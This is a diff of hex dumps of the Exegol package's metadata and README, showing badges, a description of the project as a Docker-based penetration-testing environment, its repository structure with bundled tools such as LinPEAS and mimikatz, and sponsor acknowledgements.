-000005d0: 3d22 223e 3c69 6d67 2073 7263 3d22 6874  =""><img src="ht
-000005e0: 7470 733a 2f2f 7374 6174 6963 2e70 6570  tps://static.pep
-000005f0: 792e 7465 6368 2f70 6572 736f 6e61 6c69  y.tech/personali
-00000600: 7a65 642d 6261 6467 652f 6578 6567 6f6c  zed-badge/exegol
-00000610: 3f70 6572 696f 643d 746f 7461 6c26 756e  ?period=total&un
-00000620: 6974 733d 696e 7465 726e 6174 696f 6e61  its=internationa
-00000630: 6c5f 7379 7374 656d 266c 6566 745f 636f  l_system&left_co
-00000640: 6c6f 723d 6772 6579 2672 6967 6874 5f63  lor=grey&right_c
-00000650: 6f6c 6f72 3d62 7269 6768 7467 7265 656e  olor=brightgreen
-00000660: 266c 6566 745f 7465 7874 3d44 6f77 6e6c  &left_text=Downl
-00000670: 6f61 6473 2220 616c 743d 2270 6970 2073  oads" alt="pip s
-00000680: 7461 7473 223e 3c2f 613e 0a20 203c 6272  tats"></a>.  <br
-00000690: 3e3c 6272 3e0a 2020 3c69 6d67 2061 6c74  ><br>.  <img alt
-000006a0: 3d22 6c61 7465 7374 2063 6f6d 6d69 7420  ="latest commit 
-000006b0: 6f6e 206d 6173 7465 7222 2073 7263 3d22  on master" src="
-000006c0: 6874 7470 733a 2f2f 696d 672e 7368 6965  https://img.shie
-000006d0: 6c64 732e 696f 2f67 6974 6875 622f 6c61  lds.io/github/la
-000006e0: 7374 2d63 6f6d 6d69 742f 5468 6550 6f72  st-commit/ThePor
-000006f0: 6773 2f45 7865 676f 6c2f 6d61 7374 6572  gs/Exegol/master
-00000700: 3f6c 6162 656c 3d6c 6174 6573 7425 3230  ?label=latest%20
-00000710: 7265 6c65 6173 6522 3e0a 2020 3c69 6d67  release">.  <img
-00000720: 2061 6c74 3d22 6c61 7465 7374 2063 6f6d   alt="latest com
-00000730: 6d69 7420 6f6e 2064 6576 2220 7372 633d  mit on dev" src=
-00000740: 2268 7474 7073 3a2f 2f69 6d67 2e73 6869  "https://img.shi
-00000750: 656c 6473 2e69 6f2f 6769 7468 7562 2f6c  elds.io/github/l
-00000760: 6173 742d 636f 6d6d 6974 2f54 6865 506f  ast-commit/ThePo
-00000770: 7267 732f 4578 6567 6f6c 2f64 6576 3f6c  rgs/Exegol/dev?l
-00000780: 6162 656c 3d6c 6174 6573 7425 3230 6465  abel=latest%20de
-00000790: 7622 3e0a 2020 3c62 723e 3c62 723e 0a20  v">.  <br><br>. 
-000007a0: 203c 696d 6720 616c 743d 2263 7572 7265   <img alt="curre
-000007b0: 6e74 2076 6572 7369 6f6e 2220 7372 633d  nt version" src=
-000007c0: 2268 7474 7073 3a2f 2f69 6d67 2e73 6869  "https://img.shi
-000007d0: 656c 6473 2e69 6f2f 6261 6467 652f 6c69  elds.io/badge/li
-000007e0: 6e75 782d 7375 7070 6f72 7465 642d 7375  nux-supported-su
-000007f0: 6363 6573 7322 3e0a 2020 3c69 6d67 2061  ccess">.  <img a
-00000800: 6c74 3d22 6375 7272 656e 7420 7665 7273  lt="current vers
-00000810: 696f 6e22 2073 7263 3d22 6874 7470 733a  ion" src="https:
-00000820: 2f2f 696d 672e 7368 6965 6c64 732e 696f  //img.shields.io
-00000830: 2f62 6164 6765 2f77 696e 646f 7773 2d73  /badge/windows-s
-00000840: 7570 706f 7274 6564 2d73 7563 6365 7373  upported-success
-00000850: 223e 0a20 203c 696d 6720 616c 743d 2263  ">.  <img alt="c
-00000860: 7572 7265 6e74 2076 6572 7369 6f6e 2220  urrent version" 
-00000870: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000880: 2e73 6869 656c 6473 2e69 6f2f 6261 6467  .shields.io/badg
-00000890: 652f 6d61 632d 7375 7070 6f72 7465 642d  e/mac-supported-
-000008a0: 7375 6363 6573 7322 3e0a 2020 3c62 723e  success">.  <br>
-000008b0: 0a20 203c 696d 6720 616c 743d 2261 6d64  .  <img alt="amd
-000008c0: 3634 2220 7372 633d 2268 7474 7073 3a2f  64" src="https:/
-000008d0: 2f69 6d67 2e73 6869 656c 6473 2e69 6f2f  /img.shields.io/
-000008e0: 6261 6467 652f 616d 6436 3425 3230 2878  badge/amd64%20(x
-000008f0: 3836 5f5f 3634 292d 7375 7070 6f72 7465  86__64)-supporte
-00000900: 642d 7375 6363 6573 7322 3e0a 2020 3c69  d-success">.  <i
-00000910: 6d67 2061 6c74 3d22 6172 6d36 3422 2073  mg alt="arm64" s
-00000920: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
-00000930: 7368 6965 6c64 732e 696f 2f62 6164 6765  shields.io/badge
-00000940: 2f61 726d 3634 2532 3028 6161 7263 6836  /arm64%20(aarch6
-00000950: 3429 2d73 7570 706f 7274 6564 2d73 7563  4)-supported-suc
-00000960: 6365 7373 223e 0a20 203c 6272 3e3c 6272  cess">.  <br><br
-00000970: 3e0a 2020 3c61 2068 7265 663d 2268 7474  >.  <a href="htt
-00000980: 7073 3a2f 2f74 7769 7474 6572 2e63 6f6d  ps://twitter.com
-00000990: 2f69 6e74 656e 742f 666f 6c6c 6f77 3f73  /intent/follow?s
-000009a0: 6372 6565 6e5f 6e61 6d65 3d5f 6e77 6f64  creen_name=_nwod
-000009b0: 7475 6873 2220 7469 746c 653d 2246 6f6c  tuhs" title="Fol
-000009c0: 6c6f 7722 3e3c 696d 6720 7372 633d 2268  low"><img src="h
-000009d0: 7474 7073 3a2f 2f69 6d67 2e73 6869 656c  ttps://img.shiel
-000009e0: 6473 2e69 6f2f 7477 6974 7465 722f 666f  ds.io/twitter/fo
-000009f0: 6c6c 6f77 2f5f 6e77 6f64 7475 6873 3f6c  llow/_nwodtuhs?l
-00000a00: 6162 656c 3d53 6875 7464 6f77 6e26 7374  abel=Shutdown&st
-00000a10: 796c 653d 736f 6369 616c 2220 616c 743d  yle=social" alt=
-00000a20: 2254 7769 7474 6572 2053 6875 7464 6f77  "Twitter Shutdow
-00000a30: 6e22 3e3c 2f61 3e0a 2020 3c61 2068 7265  n"></a>.  <a hre
-00000a40: 663d 2268 7474 7073 3a2f 2f74 7769 7474  f="https://twitt
-00000a50: 6572 2e63 6f6d 2f69 6e74 656e 742f 666f  er.com/intent/fo
-00000a60: 6c6c 6f77 3f73 6372 6565 6e5f 6e61 6d65  llow?screen_name
-00000a70: 3d44 7261 6d65 6c61 635f 2220 7469 746c  =Dramelac_" titl
-00000a80: 653d 2246 6f6c 6c6f 7722 3e3c 696d 6720  e="Follow"><img 
-00000a90: 7372 633d 2268 7474 7073 3a2f 2f69 6d67  src="https://img
-00000aa0: 2e73 6869 656c 6473 2e69 6f2f 7477 6974  .shields.io/twit
-00000ab0: 7465 722f 666f 6c6c 6f77 2f44 7261 6d65  ter/follow/Drame
-00000ac0: 6c61 635f 3f6c 6162 656c 3d44 7261 6d65  lac_?label=Drame
-00000ad0: 6c61 6326 7374 796c 653d 736f 6369 616c  lac&style=social
-00000ae0: 2220 616c 743d 2254 7769 7474 6572 2044  " alt="Twitter D
-00000af0: 7261 6d65 6c61 6322 3e3c 2f61 3e0a 2020  ramelac"></a>.  
-00000b00: 3c62 723e 3c62 723e 0a20 203c 6120 6872  <br><br>.  <a hr
-00000b10: 6566 3d22 6874 7470 733a 2f2f 6469 7363  ef="https://disc
-00000b20: 6f72 642e 6767 2f63 5854 6879 7037 4436  ord.gg/cXThyp7D6
-00000b30: 5022 2074 6974 6c65 3d22 4a6f 696e 2075  P" title="Join u
-00000b40: 7320 6f6e 2044 6973 636f 7264 223e 3c69  s on Discord"><i
-00000b50: 6d67 2073 7263 3d22 6874 7470 733a 2f2f  mg src="https://
-00000b60: 7261 772e 6769 7468 7562 7573 6572 636f  raw.githubuserco
-00000b70: 6e74 656e 742e 636f 6d2f 5468 6550 6f72  ntent.com/ThePor
-00000b80: 6773 2f45 7865 676f 6c2d 646f 6373 2f6d  gs/Exegol-docs/m
-00000b90: 6169 6e2f 2e61 7373 6574 732f 6469 7363  ain/.assets/disc
-00000ba0: 6f72 645f 6a6f 696e 5f75 732e 706e 6722  ord_join_us.png"
-00000bb0: 2077 6964 7468 3d22 3135 3022 2061 6c74   width="150" alt
-00000bc0: 3d22 4a6f 696e 2075 7320 6f6e 2044 6973  ="Join us on Dis
-00000bd0: 636f 7264 223e 3c2f 613e 0a20 203c 6272  cord"></a>.  <br
-00000be0: 3e3c 6272 3e0a 3c2f 6469 763e 0a0a 3e20  ><br>.</div>..> 
-00000bf0: 4578 6567 6f6c 2069 7320 6120 636f 6d6d  Exegol is a comm
-00000c00: 756e 6974 792d 6472 6976 656e 2068 6163  unity-driven hac
-00000c10: 6b69 6e67 2065 6e76 6972 6f6e 6d65 6e74  king environment
-00000c20: 2c20 706f 7765 7266 756c 2061 6e64 2079  , powerful and y
-00000c30: 6574 2073 696d 706c 6520 656e 6f75 6768  et simple enough
-00000c40: 2074 6f20 6265 2075 7365 6420 6279 2061   to be used by a
-00000c50: 6e79 6f6e 6520 696e 2064 6179 2074 6f20  nyone in day to 
-00000c60: 6461 7920 656e 6761 6765 6d65 6e74 732e  day engagements.
-00000c70: 2045 7865 676f 6c20 6973 2074 6865 2062   Exegol is the b
-00000c80: 6573 7420 736f 6c75 7469 6f6e 2074 6f20  est solution to 
-00000c90: 6465 706c 6f79 2070 6f77 6572 6675 6c20  deploy powerful 
-00000ca0: 6861 636b 696e 6720 656e 7669 726f 6e6d  hacking environm
-00000cb0: 656e 7473 2073 6563 7572 656c 792c 2065  ents securely, e
-00000cc0: 6173 696c 792c 2070 726f 6665 7373 696f  asily, professio
-00000cd0: 6e61 6c6c 792e 0a3e 2045 7865 676f 6c20  nally..> Exegol 
-00000ce0: 6669 7473 2070 656e 7465 7374 6572 732c  fits pentesters,
-00000cf0: 2043 5446 2070 6c61 7965 7273 2c20 6275   CTF players, bu
-00000d00: 6720 626f 756e 7479 2068 756e 7465 7273  g bounty hunters
-00000d10: 2c20 7265 7365 6172 6368 6572 732c 2062  , researchers, b
-00000d20: 6567 696e 6e65 7273 2061 6e64 2061 6476  eginners and adv
-00000d30: 616e 6365 6420 7573 6572 732c 2064 6566  anced users, def
-00000d40: 656e 6465 7273 2c20 6672 6f6d 2073 7479  enders, from sty
-00000d50: 6c69 7368 206d 6163 4f53 2075 7365 7273  lish macOS users
-00000d60: 2061 6e64 2063 6f72 706f 7261 7465 2057   and corporate W
-00000d70: 696e 646f 7773 2070 726f 7320 746f 2055  indows pros to U
-00000d80: 4e49 582d 6c69 6b65 2070 6f77 6572 2075  NIX-like power u
-00000d90: 7365 7273 2e0a 0a23 2047 6574 7469 6e67  sers...# Getting
-00000da0: 2073 7461 7274 6564 0a0a 596f 7520 6361   started..You ca
-00000db0: 6e20 7265 6665 7220 746f 2074 6865 205b  n refer to the [
-00000dc0: 4578 6567 6f6c 2064 6f63 756d 656e 7461  Exegol documenta
-00000dd0: 7469 6f6e 735d 2868 7474 7073 3a2f 2f65  tions](https://e
-00000de0: 7865 676f 6c2e 7265 6164 7468 6564 6f63  xegol.readthedoc
-00000df0: 732e 696f 2f29 2e0a 0a23 2320 5072 6f6a  s.io/)...## Proj
-00000e00: 6563 7420 7374 7275 6374 7572 650a 0a42  ect structure..B
-00000e10: 656c 6f77 2061 7265 2073 6f6d 6520 6275  elow are some bu
-00000e20: 6c6c 6574 2070 6f69 6e74 7320 746f 2062  llet points to b
-00000e30: 6574 7465 7220 756e 6465 7273 7461 6e64  etter understand
-00000e40: 2068 6f77 2045 7865 676f 6c20 776f 726b   how Exegol work
-00000e50: 730a 2d20 5468 6973 2072 6570 6f73 6974  s.- This reposit
-00000e60: 6f72 7920 285b 4578 6567 6f6c 5d28 6874  ory ([Exegol](ht
-00000e70: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
-00000e80: 2f54 6865 506f 7267 732f 4578 6567 6f6c  /ThePorgs/Exegol
-00000e90: 2929 2063 6f6e 7461 696e 7320 7468 6520  )) contains the 
-00000ea0: 636f 6465 2066 6f72 2074 6865 2050 7974  code for the Pyt
-00000eb0: 686f 6e20 7772 6170 7065 722e 2049 7427  hon wrapper. It'
-00000ec0: 7320 7468 6520 656e 7472 7970 6f69 6e74  s the entrypoint
-00000ed0: 206f 6620 7468 6520 4578 6567 6f6c 2070   of the Exegol p
-00000ee0: 726f 6a65 6374 2e20 5468 6520 7772 6170  roject. The wrap
-00000ef0: 7065 7220 6361 6e20 6265 2069 6e73 7461  per can be insta
-00000f00: 6c6c 6564 2066 726f 6d20 736f 7572 6365  lled from source
-00000f10: 732c 2062 7574 205b 6120 5079 5049 2070  s, but [a PyPI p
-00000f20: 6163 6b61 6765 5d28 6874 7470 733a 2f2f  ackage](https://
-00000f30: 7079 7069 2e6f 7267 2f70 726f 6a65 6374  pypi.org/project
-00000f40: 2f45 7865 676f 6c2f 2920 6973 2061 7661  /Exegol/) is ava
-00000f50: 696c 6162 6c65 2e0a 2d20 5468 6520 5b45  ilable..- The [E
-00000f60: 7865 676f 6c2d 696d 6167 6573 5d28 6874  xegol-images](ht
-00000f70: 7470 733a 2f2f 6769 7468 7562 2e63 6f6d  tps://github.com
-00000f80: 2f54 6865 506f 7267 732f 4578 6567 6f6c  /ThePorgs/Exegol
-00000f90: 2d69 6d61 6765 7329 2072 6570 6f20 6973  -images) repo is
-00000fa0: 206c 6f61 6465 6420 6173 2061 2073 7562   loaded as a sub
-00000fb0: 6d6f 6475 6c65 2e20 4974 2069 6e63 6c75  module. It inclu
-00000fc0: 6465 7320 616c 6c20 6e65 6365 7373 6172  des all necessar
-00000fd0: 7920 6173 7365 7473 2074 6f20 6275 696c  y assets to buil
-00000fe0: 6420 446f 636b 6572 2069 6d61 6765 732e  d Docker images.
-00000ff0: 204e 6f74 6162 656e 653a 2074 6865 2069   Notabene: the i
-00001000: 6d61 6765 2061 7265 2061 6c72 6561 6479  mage are already
-00001010: 2062 7569 6c74 2061 6e64 206f 6666 6572   built and offer
-00001020: 6564 206f 6e20 5b74 6865 206f 6666 6963  ed on [the offic
-00001030: 6961 6c20 446f 636b 6572 6875 6220 7265  ial Dockerhub re
-00001040: 6769 7374 7279 5d28 6874 7470 733a 2f2f  gistry](https://
-00001050: 6875 622e 646f 636b 6572 2e63 6f6d 2f72  hub.docker.com/r
-00001060: 6570 6f73 6974 6f72 792f 646f 636b 6572  epository/docker
-00001070: 2f6e 776f 6474 7568 732f 6578 6567 6f6c  /nwodtuhs/exegol
-00001080: 292e 0a2d 2054 6865 205b 4578 6567 6f6c  )..- The [Exegol
-00001090: 2d72 6573 6f75 7263 6573 5d28 6874 7470  -resources](http
-000010a0: 733a 2f2f 6769 7468 7562 2e63 6f6d 2f54  s://github.com/T
-000010b0: 6865 506f 7267 732f 4578 6567 6f6c 2d72  hePorgs/Exegol-r
-000010c0: 6573 6f75 7263 6573 2920 7265 706f 2069  esources) repo i
-000010d0: 7320 6c6f 6164 6564 2061 7320 6120 7375  s loaded as a su
-000010e0: 626d 6f64 756c 652e 2049 7420 696e 636c  bmodule. It incl
-000010f0: 7564 6573 2061 6c6c 2072 6573 6f75 7263  udes all resourc
-00001100: 6573 206d 656e 7469 6f6e 6564 2070 7265  es mentioned pre
-00001110: 7669 6f75 736c 7920 284c 696e 5045 4153  viously (LinPEAS
-00001120: 2c20 5769 6e50 4541 532c 204c 696e 456e  , WinPEAS, LinEn
-00001130: 756d 2c20 5072 6976 6573 6343 6865 636b  um, PrivescCheck
-00001140: 2c20 5379 7369 6e74 6572 6e61 6c73 5375  , SysinternalsSu
-00001150: 6974 652c 206d 696d 696b 6174 7a2c 2052  ite, mimikatz, R
-00001160: 7562 6575 732c 2050 6f77 6572 5370 6c6f  ubeus, PowerSplo
-00001170: 6974 2061 6e64 206d 616e 7920 6d6f 7265  it and many more
-00001180: 2e29 2e0a 2d20 5468 6520 5b45 7865 676f  .)..- The [Exego
-00001190: 6c2d 646f 6373 5d28 6874 7470 733a 2f2f  l-docs](https://
-000011a0: 6769 7468 7562 2e63 6f6d 2f54 6865 506f  github.com/ThePo
-000011b0: 7267 732f 4578 6567 6f6c 2d64 6f63 7329  rgs/Exegol-docs)
-000011c0: 2072 6570 6f20 666f 7220 7468 6520 646f   repo for the do
-000011d0: 6375 6d65 6e74 6174 696f 6e2c 2064 6573  cumentation, des
-000011e0: 7469 6e65 6420 666f 7220 7573 6572 7320  tined for users 
-000011f0: 6173 2077 656c 6c20 6173 2064 6576 656c  as well as devel
-00001200: 6f70 7065 7273 2061 6e64 2063 6f6e 7472  oppers and contr
-00001210: 6962 7574 6f72 732e 2054 6865 2047 6974  ibutors. The Git
-00001220: 4875 6220 7265 706f 2068 6f6c 6473 2074  Hub repo holds t
-00001230: 6865 2073 6f75 7263 6573 2074 6861 7420  he sources that 
-00001240: 6172 6520 636f 6d70 696c 6564 206f 6e20  are compiled on 
-00001250: 6874 7470 733a 2f2f 6578 6567 6f6c 2e72  https://exegol.r
-00001260: 6561 6474 6865 646f 6373 2e69 6f2f 2e0a  eadthedocs.io/..
-00001270: 0a23 2053 706f 6e73 6f72 730a 0a3c 6469  .# Sponsors..<di
-00001280: 7620 616c 6967 6e3d 2263 656e 7465 7222  v align="center"
-00001290: 3e0a 2020 3c61 2068 7265 663d 2268 7474  >.  <a href="htt
-000012a0: 7073 3a2f 2f77 7777 2e63 6170 6765 6d69  ps://www.capgemi
-000012b0: 6e69 2e63 6f6d 2f22 2074 6974 6c65 3d22  ni.com/" title="
-000012c0: 466f 6c6c 6f77 223e 0a20 2020 203c 696d  Follow">.    <im
-000012d0: 6720 7769 6474 683d 2233 3030 2220 7372  g width="300" sr
-000012e0: 633d 2268 7474 7073 3a2f 2f75 706c 6f61  c="https://uploa
-000012f0: 642e 7769 6b69 6d65 6469 612e 6f72 672f  d.wikimedia.org/
-00001300: 7769 6b69 7065 6469 612f 6672 2f74 6875  wikipedia/fr/thu
-00001310: 6d62 2f62 2f62 352f 4361 7067 656d 696e  mb/b/b5/Capgemin
-00001320: 695f 4c6f 676f 2e73 7667 2f31 3238 3070  i_Logo.svg/1280p
-00001330: 782d 4361 7067 656d 696e 695f 4c6f 676f  x-Capgemini_Logo
-00001340: 2e73 7667 2e70 6e67 223e 0a20 203c 2f61  .svg.png">.  </a
-00001350: 3e0a 3c2f 6469 763e 0a0a 4472 616d 656c  >.</div>..Dramel
-00001360: 6163 2061 6e64 2049 2077 6f72 6b20 6174  ac and I work at
-00001370: 202a 4361 7067 656d 696e 692a 2061 6e64   *Capgemini* and
-00001380: 2077 6520 7468 616e 6b20 7468 656d 2066   we thank them f
-00001390: 6f72 2061 6c6c 6f63 6174 696e 6720 736f  or allocating so
-000013a0: 6d65 2074 696d 6520 666f 7220 7573 2074  me time for us t
-000013b0: 6f20 6465 7665 6c6f 7020 616e 6420 6d61  o develop and ma
-000013c0: 696e 7461 696e 2045 7865 676f 6c21 2056  intain Exegol! V
-000013d0: 6973 6974 2043 6170 6765 6d69 6e69 2077  isit Capgemini w
-000013e0: 6562 7369 7465 2061 7420 6874 7470 733a  ebsite at https:
-000013f0: 2f2f 7777 772e 6361 7067 656d 696e 692e  //www.capgemini.
-00001400: 636f 6d2f 2e0a 0a5f 5f5f 0a0a 3c64 6976  com/...___..<div
-00001410: 2061 6c69 676e 3d22 6365 6e74 6572 223e   align="center">
-00001420: 0a20 203c 6120 6872 6566 3d22 6874 7470  .  <a href="http
-00001430: 733a 2f2f 7777 772e 6861 636b 7468 6562  s://www.hacktheb
-00001440: 6f78 2e63 6f6d 2f22 2074 6974 6c65 3d22  ox.com/" title="
-00001450: 466f 6c6c 6f77 223e 0a20 2020 203c 696d  Follow">.    <im
-00001460: 6720 7769 6474 683d 2233 3030 2220 7372  g width="300" sr
-00001470: 633d 2268 7474 7073 3a2f 2f65 7865 676f  c="https://exego
-00001480: 6c2e 7265 6164 7468 6564 6f63 732e 696f  l.readthedocs.io
-00001490: 2f65 6e2f 6c61 7465 7374 2f5f 696d 6167  /en/latest/_imag
-000014a0: 6573 2f68 6163 6b74 6865 626f 782e 706e  es/hackthebox.pn
-000014b0: 6722 3e0a 2020 3c2f 613e 0a3c 2f64 6976  g">.  </a>.</div
-000014c0: 3e0a 0a57 6520 616c 736f 2074 6861 6e6b  >..We also thank
-000014d0: 202a 4861 636b 5468 6542 6f78 2a20 666f   *HackTheBox* fo
-000014e0: 7220 636f 6e74 696e 756f 7573 6c79 2073  r continuously s
-000014f0: 7570 706f 7274 696e 6720 7468 6520 636f  upporting the co
-00001500: 6d6d 756e 6974 7920 616e 6420 666f 7220  mmunity and for 
-00001510: 6865 6c70 696e 6720 7573 2066 696e 616e  helping us finan
-00001520: 6369 616c 6c79 2074 6f20 6163 7175 6972  cially to acquir
-00001530: 6520 7468 6520 6e65 6365 7373 6172 7920  e the necessary 
-00001540: 6861 7264 7761 7265 2066 6f72 2073 7570  hardware for sup
-00001550: 706f 7274 696e 6720 6d75 6c74 6970 6c65  porting multiple
-00001560: 2061 7263 6869 7465 6374 7572 6573 2028   architectures (
-00001570: 414d 4436 342c 2041 524d 3634 292e 2053  AMD64, ARM64). S
-00001580: 686f 7720 736f 6d65 206c 6f76 6520 6174  how some love at
-00001590: 2068 7474 7073 3a2f 2f77 7777 2e68 6163   https://www.hac
-000015a0: 6b74 6865 626f 782e 636f 6d2f 2021 0a0a  kthebox.com/ !..
+00000330: 436c 6173 7369 6669 6572 3a20 5072 6f67  Classifier: Prog
+00000340: 7261 6d6d 696e 6720 4c61 6e67 7561 6765  ramming Language
+00000350: 203a 3a20 5079 7468 6f6e 203a 3a20 332e   :: Python :: 3.
+00000360: 3131 0a43 6c61 7373 6966 6965 723a 204c  11.Classifier: L
+00000370: 6963 656e 7365 203a 3a20 4f53 4920 4170  icense :: OSI Ap
+00000380: 7072 6f76 6564 203a 3a20 474e 5520 4765  proved :: GNU Ge
+00000390: 6e65 7261 6c20 5075 626c 6963 204c 6963  neral Public Lic
+000003a0: 656e 7365 2076 3320 2847 504c 7633 290a  ense v3 (GPLv3).
+000003b0: 436c 6173 7369 6669 6572 3a20 4f70 6572  Classifier: Oper
+000003c0: 6174 696e 6720 5379 7374 656d 203a 3a20  ating System :: 
+000003d0: 4f53 2049 6e64 6570 656e 6465 6e74 0a52  OS Independent.R
+000003e0: 6571 7569 7265 732d 5079 7468 6f6e 3a20  equires-Python: 
+000003f0: 3e3d 332e 372c 203c 340a 4465 7363 7269  >=3.7, <4.Descri
+00000400: 7074 696f 6e2d 436f 6e74 656e 742d 5479  ption-Content-Ty
+00000410: 7065 3a20 7465 7874 2f6d 6172 6b64 6f77  pe: text/markdow
+00000420: 6e0a 4c69 6365 6e73 652d 4669 6c65 3a20  n.License-File: 
+00000430: 4c49 4345 4e53 450a 0a3c 6469 7620 616c  LICENSE..<div al
+00000440: 6967 6e3d 2263 656e 7465 7222 3e0a 2020  ign="center">.  
+00000450: 3c69 6d67 2061 6c74 3d22 6c61 7465 7374  <img alt="latest
+00000460: 2063 6f6d 6d69 7420 6f6e 206d 6173 7465   commit on maste
+00000470: 7222 2077 6964 7468 3d22 3630 3022 2073  r" width="600" s
+00000480: 7263 3d22 6874 7470 733a 2f2f 7261 772e  rc="https://raw.
+00000490: 6769 7468 7562 7573 6572 636f 6e74 656e  githubuserconten
+000004a0: 742e 636f 6d2f 5468 6550 6f72 6773 2f45  t.com/ThePorgs/E
+000004b0: 7865 676f 6c2d 646f 6373 2f6d 6169 6e2f  xegol-docs/main/
+000004c0: 2e61 7373 6574 732f 726f 756e 6465 645f  .assets/rounded_
+000004d0: 736f 6369 616c 5f70 7265 7669 6577 2e70  social_preview.p
+000004e0: 6e67 223e 0a20 203c 6272 3e3c 6272 3e0a  ng">.  <br><br>.
+000004f0: 2020 3c61 2074 6172 6765 743d 225f 626c    <a target="_bl
+00000500: 616e 6b22 2072 656c 3d22 6e6f 6f70 656e  ank" rel="noopen
+00000510: 6572 206e 6f72 6566 6572 7265 7222 2068  er noreferrer" h
+00000520: 7265 663d 2268 7474 7073 3a2f 2f70 7970  ref="https://pyp
+00000530: 692e 6f72 672f 7072 6f6a 6563 742f 4578  i.org/project/Ex
+00000540: 6567 6f6c 2220 7469 746c 653d 2222 3e3c  egol" title=""><
+00000550: 696d 6720 7372 633d 2268 7474 7073 3a2f  img src="https:/
+00000560: 2f69 6d67 2e73 6869 656c 6473 2e69 6f2f  /img.shields.io/
+00000570: 7079 7069 2f76 2f45 7865 676f 6c3f 636f  pypi/v/Exegol?co
+00000580: 6c6f 723d 696e 666f 726d 6174 696f 6e61  lor=informationa
+00000590: 6c22 2061 6c74 3d22 7069 7020 7061 636b  l" alt="pip pack
+000005a0: 6167 6520 7665 7273 696f 6e22 3e3c 2f61  age version"></a
+000005b0: 3e0a 2020 3c69 6d67 2061 6c74 3d22 5079  >.  <img alt="Py
+000005c0: 7468 6f6e 332e 3722 2073 7263 3d22 6874  thon3.7" src="ht
+000005d0: 7470 733a 2f2f 696d 672e 7368 6965 6c64  tps://img.shield
+000005e0: 732e 696f 2f62 6164 6765 2f50 7974 686f  s.io/badge/Pytho
+000005f0: 6e2d 332e 372b 2d69 6e66 6f72 6d61 7469  n-3.7+-informati
+00000600: 6f6e 616c 223e 0a20 203c 6120 7461 7267  onal">.  <a targ
+00000610: 6574 3d22 5f62 6c61 6e6b 2220 7265 6c3d  et="_blank" rel=
+00000620: 226e 6f6f 7065 6e65 7220 6e6f 7265 6665  "noopener norefe
+00000630: 7272 6572 2220 6872 6566 3d22 6874 7470  rrer" href="http
+00000640: 733a 2f2f 7065 7079 2e74 6563 682f 7072  s://pepy.tech/pr
+00000650: 6f6a 6563 742f 6578 6567 6f6c 2220 7469  oject/exegol" ti
+00000660: 746c 653d 2222 3e3c 696d 6720 7372 633d  tle=""><img src=
+00000670: 2268 7474 7073 3a2f 2f73 7461 7469 632e  "https://static.
+00000680: 7065 7079 2e74 6563 682f 7065 7273 6f6e  pepy.tech/person
+00000690: 616c 697a 6564 2d62 6164 6765 2f65 7865  alized-badge/exe
+000006a0: 676f 6c3f 7065 7269 6f64 3d74 6f74 616c  gol?period=total
+000006b0: 2675 6e69 7473 3d69 6e74 6572 6e61 7469  &units=internati
+000006c0: 6f6e 616c 5f73 7973 7465 6d26 6c65 6674  onal_system&left
+000006d0: 5f63 6f6c 6f72 3d67 7265 7926 7269 6768  _color=grey&righ
+000006e0: 745f 636f 6c6f 723d 6272 6967 6874 6772  t_color=brightgr
+000006f0: 6565 6e26 6c65 6674 5f74 6578 743d 446f  een&left_text=Do
+00000700: 776e 6c6f 6164 7322 2061 6c74 3d22 7069  wnloads" alt="pi
+00000710: 7020 7374 6174 7322 3e3c 2f61 3e0a 2020  p stats"></a>.  
+00000720: 3c62 723e 3c62 723e 0a20 203c 696d 6720  <br><br>.  <img 
+00000730: 616c 743d 226c 6174 6573 7420 636f 6d6d  alt="latest comm
+00000740: 6974 206f 6e20 6d61 7374 6572 2220 7372  it on master" sr
+00000750: 633d 2268 7474 7073 3a2f 2f69 6d67 2e73  c="https://img.s
+00000760: 6869 656c 6473 2e69 6f2f 6769 7468 7562  hields.io/github
+00000770: 2f6c 6173 742d 636f 6d6d 6974 2f54 6865  /last-commit/The
+00000780: 506f 7267 732f 4578 6567 6f6c 2f6d 6173  Porgs/Exegol/mas
+00000790: 7465 723f 6c61 6265 6c3d 6c61 7465 7374  ter?label=latest
+000007a0: 2532 3072 656c 6561 7365 223e 0a20 203c  %20release">.  <
+000007b0: 696d 6720 616c 743d 226c 6174 6573 7420  img alt="latest 
+000007c0: 636f 6d6d 6974 206f 6e20 6465 7622 2073  commit on dev" s
+000007d0: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
+000007e0: 7368 6965 6c64 732e 696f 2f67 6974 6875  shields.io/githu
+000007f0: 622f 6c61 7374 2d63 6f6d 6d69 742f 5468  b/last-commit/Th
+00000800: 6550 6f72 6773 2f45 7865 676f 6c2f 6465  ePorgs/Exegol/de
+00000810: 763f 6c61 6265 6c3d 6c61 7465 7374 2532  v?label=latest%2
+00000820: 3064 6576 223e 0a20 203c 6272 3e3c 6272  0dev">.  <br><br
+00000830: 3e0a 2020 3c69 6d67 2061 6c74 3d22 6375  >.  <img alt="cu
+00000840: 7272 656e 7420 7665 7273 696f 6e22 2073  rrent version" s
+00000850: 7263 3d22 6874 7470 733a 2f2f 696d 672e  rc="https://img.
+00000860: 7368 6965 6c64 732e 696f 2f62 6164 6765  shields.io/badge
+00000870: 2f6c 696e 7578 2d73 7570 706f 7274 6564  /linux-supported
+00000880: 2d73 7563 6365 7373 223e 0a20 203c 696d  -success">.  <im
+00000890: 6720 616c 743d 2263 7572 7265 6e74 2076  g alt="current v
+000008a0: 6572 7369 6f6e 2220 7372 633d 2268 7474  ersion" src="htt
+000008b0: 7073 3a2f 2f69 6d67 2e73 6869 656c 6473  ps://img.shields
+000008c0: 2e69 6f2f 6261 6467 652f 7769 6e64 6f77  .io/badge/window
+000008d0: 732d 7375 7070 6f72 7465 642d 7375 6363  s-supported-succ
+000008e0: 6573 7322 3e0a 2020 3c69 6d67 2061 6c74  ess">.  <img alt
+000008f0: 3d22 6375 7272 656e 7420 7665 7273 696f  ="current versio
+00000900: 6e22 2073 7263 3d22 6874 7470 733a 2f2f  n" src="https://
+00000910: 696d 672e 7368 6965 6c64 732e 696f 2f62  img.shields.io/b
+00000920: 6164 6765 2f6d 6163 2d73 7570 706f 7274  adge/mac-support
+00000930: 6564 2d73 7563 6365 7373 223e 0a20 203c  ed-success">.  <
+00000940: 6272 3e0a 2020 3c69 6d67 2061 6c74 3d22  br>.  <img alt="
+00000950: 616d 6436 3422 2073 7263 3d22 6874 7470  amd64" src="http
